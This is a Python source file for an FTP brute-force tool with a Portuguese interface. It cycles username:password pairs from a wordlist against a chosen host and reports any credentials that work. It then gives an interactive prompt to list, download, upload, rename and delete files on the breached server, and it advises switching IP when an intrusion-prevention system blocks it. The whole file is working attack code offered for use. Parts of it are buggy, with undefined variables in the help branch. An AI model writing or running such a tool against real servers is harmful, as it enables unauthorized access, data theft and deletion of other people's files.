import os
import sys
import socket
import ftplib
import threading
from time import sleep

logged = False
logar = False
usern = False
paswd = False

def Comandos():
	print("""
\033[1mComando [\033[m \033[1;32mLS\033[m \033[1m] - Para listar o diretório\033[m
\033[1mComando [\033[m \033[1;32mCD\033[m \033[1m] - Para entrar dentro de um diretório\033[m
\033[1mComando [\033[m \033[1;32mCL\033[m \033[1m] - Para limpar a tela\033[m
\033[1mComando [\033[m \033[1;32mHP\033[m \033[1m] - Para visualizar os comandos do servidor\033[m
\033[1mComando [\033[m \033[1;32mPA\033[m \033[1m] - Para entrar no modo passivo (pode ser desconectado)\033[m
\033[1mComando [\033[m \033[1;32mCW\033[m \033[1m] - Para entrar direto no diretório\033[m
\033[1mComando [\033[m \033[1;32mDW\033[m \033[1m] - Para fazer o download de um arquivo\033[m
\033[1mComando [\033[m \033[1;32mUP\033[m \033[1m] - Para fazer o upload de um arquivo\033[m
\033[1mComando [\033[m \033[1;32mRN\033[m \033[1m] - Para renomear um arquivo no servidor\033[m
\033[1mComando [\033[m \033[1;32mEX\033[m \033[1m] - Para excluir arquivos do servidor\033[m
\033[1mComando [\033[m \033[1;32mMK\033[m \033[1m] - Para criar um diretório no servidor\033[m
\033[1mComando [\033[m \033[1;32mPW\033[m \033[1m] - Para retornar o caminho atual\033[m
\033[1mComando [\033[m \033[1;32mRM\033[m \033[1m] - Para remover um diretório\033[m
\033[1mComando [\033[m \033[1;32mQT\033[m \033[1m] - Para finalizar a conexão\033[m""")

def Banner():
	match sys.platform:
		case "win32":
			os.system("cls")
		case "linux":
			os.system("clear")
		case _:
			os.system("clear")
	print("""\033[1;36m
		   _ _                         
		 _| |_|___ ___ ___ _ _ ___ ___ 
		| . | |_ -|  _| . | | | -_|  _|
		|___|_|___|___|___|\_/|___|_|  
		\033[m \033[1;31mcriador:\033[m \033[1mNano | \033[m\033[1;31mversion:\033[m \033[1m1.0\033[m
		           \033[1;32mFtp-Brute\033[m\n""".strip(""))
Banner()
try:
	rhost = str(input("\033[1;34m[+]\033[m\033[1m Host:\033[m ")).strip()
	rport = str(input("\033[1;34m[+]\033[m\033[1m Port:\033[m ")).strip()
except KeyboardInterrupt:
	raise SystemExit
if rhost and rport != "":
	if rport.isnumeric():
		Banner()
		try:
			tam = open("wordlist_ftp.txt","r").readlines()
			print("\033[1;32m[+]\033[m\033[1m Wordlist carregada\033[m")
			print("\033[1;32m[+]\033[m\033[1m Tentativas de login:\033[m \033[1;35m{}\033[m\n".format(len(tam)))
			with open("wordlist_ftp.txt","r") as wrd:
				try:
					for logins in wrd:
						server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
						login = logins.replace("\n","").split(":")
						username = login[0]
						password = login[1]
						print("\033[1;34m[*]\033[m\033[1m Tentando fazer login com o usuário\033[m\033[1;34m {}\033[m\033[1m e senha\033[m\033[1;34m {}\033[m\033[1m...\033[m".format(username,password))
						try:
							thread = []
							threads = threading.Thread(target=server.connect((rhost,int(rport))))
							threads.start()
							threads.join()
							thread.append(threads)
						except ConnectionResetError:
							server.close()
							print("\n\033[1;31m[-] IPS block, troque seu IP e tente novamente!\033[m")
							print("\033[1;31m[!]\033[m\033[1mDiminua a wordlist para um resultado mais eficaz!\033[m\n")
							raise SystemExit
						except:
							print("\n\033[1;31m[!]\033[m\033[1m Ooops:\033[m")
							print("\033[1;31m[!]\033[m\033[1m Erro ao se conectar, servidor offline, tente mais tarde...\033[m\n")
							server.close()
							raise SystemExit
						else:
							grebbing = server.recv(2048).decode()
							server.send(b"USER "+username.encode()+b"\r\n")
							response_usuario_1 = server.recv(2048).decode()
							server.send(b"PASS "+password.encode()+b"\r\n")
							senhas_resp = server.recv(2048).decode()
							if "230" in senhas_resp:
								logged = True
								print("\n\033[1;36m[!] Login efetuado com sucesso!\033[m")
								print("\033[1;32m[+] Hostname:\033[m\033[1m {}\033[m".format(rhost))
								print("\033[1;32m[+] Username:\033[m\033[1m {}\033[m".format(username))
								print("\033[1;32m[+] Password:\033[m\033[1m {}\033[m\n".format(password))
								server.close()
								login = str(input("\033[1;34m[*]\033[m\033[1m Deseja entrar no servidor? (s/n): \033[m")).strip().lower()
								if login != "":
									if login == "s":
										usern = username
										paswd = password
										logar = True
										break
									else:
										print("\033[1;34m[*]\033[m\033[1m Bye!\033[m\n")
										raise SystemExit
								else:
									print("\033[1;34m[*]\033[m\033[1m Você não deu uma resposta, bye!\033[m")
									raise SystemExit
							else:
								server.close()
					if not logged:
						print("\n\033[1;31m[-]\033[m\033[1m Não encontrei nenhuma credencial válida para esse servidor na Wordlist!\033[m\n")
						server.close()
						raise SystemExit
				except KeyboardInterrupt:
					raise SystemExit
		except FileNotFoundError:
			print("\n\033[1;31m[!]\033[m\033[1m Não encontrei o arquivo wordlist_ftp.txt!\033[m\n")
if logar == True:
	Banner()
	MYSOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	entrar = ftplib.FTP(host=rhost)
	entrar1 = entrar.login(user=usern,passwd=paswd)
	print("\033[1m[\033[m\033[1;32m OK! \033[m\033[1m]\033[m\033[1m Você conseguiu acesso ao servidor:\033[m \033[1;36m{}\033[m".format(rhost))
	print("\033[1m[\033[m\033[1;32m OK! \033[m\033[1m]\033[m\033[1m Digite C para ter acesso a shell!\033[m\n")
	while entrar:
		comando_user = str(input("\n\033[1;31mftp@ftpbrute~>\033[m ")).strip().lower()
		print()
		try:
			if comando_user == "c":
				Comandos()
			elif comando_user == "cd":
				directory = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório:\033[m ")).strip()
				try:
					entrar.cwd(directory)
				except ftplib.error_perm:
					try:
						entrar.cwd(directory.lower())
					except ftplib.error_perm:
						try:
							entrar.cwd(directory.capitalize())
						except:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Permissão negada!\033[m")
			elif comando_user == "hp":
				print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Todos esses comandos foram para o meu painel de help,\033[m \033[1;32mDIGITE C\033[m \033[1mpara ver!\033[m\n\n")
				usernames = userlogin.encode()
				passwords = userpassw.encode()
				try:
					MYSOCKET.connect((rhost,rport))
				except Exception as s:
					print(s)
				baner_pass = MYSOCKET.recv(1024)
				MYSOCKET.send(b"USER "+usern.encode()+b"\r\n")
				userrecv = MYSOCKET.recv(1048)
				MYSOCKET.send(b"PASS "+paswd.encode()+b"\r\n")
				paswrecv = MYSOCKET.recv(1048) 
				MYSOCKET.send(b"HELP \r\n")
				ignore = MYSOCKET.recv(2048)
				MYSOCKET.send(b"HELP \r\n")
				accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
				print(accept)
			elif comando_user == "ls":
				entrar.dir()
			elif comando_user == "pa":
				try:
					MYSOCKET.connect((rhost,rport))
				except:
					MYSOCKET.connect((rhost,21))
				baner_pass = MYSOCKET.recv(1024)
				MYSOCKET.send(b"USER "+usern.encode()+b"\r\n")
				userrecv = MYSOCKET.recv(1048)
				MYSOCKET.send(b"PASS "+paswd.encode()+b"\r\n")
				paswrecv = MYSOCKET.recv(1048) 
				MYSOCKET.send(b"PASV \r\n")
				acpt = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
				if "227" in acpt:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Modo passivo ativado!\033[m")
			elif comando_user == "cl":
				if sys.platform == "win32":
					os.system("cls")
					banner()
				elif sys.platform == "linux":
					os.system("clear")
			elif comando_user == "qt":
				print("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m\033[1m Fechando conexão...\033[m")
				try:
					entrar.quit()
					MYSOCKET.close()
				except TimeoutError:
					raise SystemExit
				else:
					raise SystemExit
			elif comando_user == "dw":
				arquivo_download = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m \033[1mNome do arquivo a ser baixado:\033[m ")).strip()
				print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Tentando realizar o download...\033[m")
				try: 
					with open(arquivo_download,"wb") as arqs:
						entrar.retrbinary(f"RETR {arquivo_download}",arqs.write)
						arqs.close()
				except ftplib.all_errors:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m O arquivo pode ser um diretório ou sua permissão foi negada!\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo baixado!\033[m")
			elif comando_user == "rn":
				nome_arquivo_orign = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
				nome_novo_arquivos = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Novo nome: \033[m")).strip()
				try:
					entrar.rename(fromname=nome_arquivo_orign,toname=nome_novo_arquivos)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Alteração negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo alterado!\033[m")
			elif comando_user == "pw":
				route = entrar.pwd()
				if route == "/":
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Você está na pasta raiz!\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Caminho: {}".format(route))
			elif comando_user == "cw":
				directory_enter = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório: \033[m")).strip()
				entrar.cwd(directory_enter)
			elif comando_user == "ex":
				dirname = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório/arquivo a ser removido: \033[m")).strip()
				try:
					entrar.rmd(dirname)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Remoção negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo\033[m \033[1;33m{}\033[m removido!\033[m".format(dirname))
			elif comando_user == "mk":
				dirname_create = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório a ser criado: \033[m")).strip()
				try:
					entrar.mkd(dirname_create)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Criação negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo criado!\033[m")
			elif comando_user == "rm":
				dirname_2 = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
				try:
					entrar.delete(dirname_2)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Remoção negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo\033[m \033[1;33m{}\033[m removido!\033[m".format(dirname))
			elif comando_user == "up":
				nome_arquivo_upload = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
				try:
					with open(nome_arquivo_upload,"rb") as uploads:
						entrar.storbinary(f"STOR {nome_arquivo_upload}",uploads)
					uploads.close()
				except FileNotFoundError:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Arquivo não encontrado!\033[m")
				except PermissionError:
					pass
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Upload negado! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo enviado!\033[m")
			elif comando_user == "ld":
				print(entrar.mlsd())
			else:
				print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Comando não reconhecido! Digite C para ver os comandos!\033[m")
		except TimeoutError:
			print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão encerrada porque o tempo de resposta foi excedido!\033[m\n")
			entrar.quit()
			raise SystemExit
		except KeyboardInterrupt:
			raise SystemExit
		except OSError:
			print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Você foi desconectado do servidor, relogue!\033[m\n")
			raise SystemExit
	else:
		print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Nenhuma senha encontrada para esse servidor...\n")
else:
	pass
# Brute Force para FTP | Coded by: Nano!
